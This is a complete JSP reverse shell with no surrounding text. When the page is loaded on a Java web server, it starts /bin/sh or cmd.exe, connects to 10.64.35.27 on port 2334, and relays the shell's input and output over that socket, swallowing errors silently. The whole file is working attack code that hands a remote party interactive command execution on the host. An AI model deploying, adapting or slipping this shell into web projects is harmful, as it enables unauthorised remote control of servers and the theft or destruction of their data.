<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream jp;
    OutputStream sp;

    StreamConnector( InputStream jp, OutputStream sp )
    {
      this.jp = jp;
      this.sp = sp;
    }

    public void run()
    {
      BufferedReader iq  = null;
      BufferedWriter ilz = null;
      try
      {
        iq  = new BufferedReader( new InputStreamReader( this.jp ) );
        ilz = new BufferedWriter( new OutputStreamWriter( this.sp ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = iq.read( buffer, 0, buffer.length ) ) > 0 )
        {
          ilz.write( buffer, 0, length );
          ilz.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( iq != null )
          iq.close();
        if( ilz != null )
          ilz.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.64.35.27", 2334 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
